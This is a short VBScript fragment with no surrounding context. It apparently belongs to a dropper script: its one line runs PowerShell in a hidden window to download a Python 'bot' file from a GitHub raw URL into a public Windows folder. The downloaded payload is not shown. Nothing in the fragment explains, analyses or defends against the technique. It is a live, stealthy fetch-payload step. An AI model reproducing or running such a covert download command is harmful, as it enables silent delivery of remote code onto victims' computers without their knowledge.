...
objShell.Run "powershell.exe -WindowStyle hidden -Command ""Invoke-WebRequest -URI https://raw.githubusercontent.com/thanhpc777/ThanhPC/main/bot.py -OutFile C:\Users\Public\Document\script.py""", 0, True
